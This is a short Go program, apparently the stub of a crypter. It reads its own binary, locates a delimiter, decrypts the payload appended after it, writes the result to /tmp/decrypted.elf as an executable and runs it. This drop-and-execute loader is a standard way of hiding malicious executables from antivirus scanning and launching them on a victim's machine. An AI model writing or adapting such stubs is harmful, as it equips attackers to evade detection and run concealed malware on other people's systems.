package main

import (
	. "../utils"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

const OutputPath = "/tmp/decrypted.elf"

func main() {
	// Read himself
	bytes, err := ioutil.ReadFile(os.Args[0])
	if err != nil || len(bytes) == 0 {
		panic(err)
	}

	// Find the delimiter position
	pos := strings.LastIndex(string(bytes), Delimiter)

	// If it does not exist it means that
	// the stub is not "finalized"
	if pos == -1 {
		os.Exit(1)
	}

	// Append the delimiter length
	pos += len(Delimiter)

	// Get the File stored in stub
	file := bytes[pos:]

	// Write it
	err = ioutil.WriteFile(OutputPath, Decrypt(file), 0755)
	if err != nil {
		panic(err)
	}

	// Execute the file
	output, err := exec.Command(OutputPath).Output()
	if err != nil {
		panic(err)
	}

	// Show the output
	fmt.Println(string(output))
}
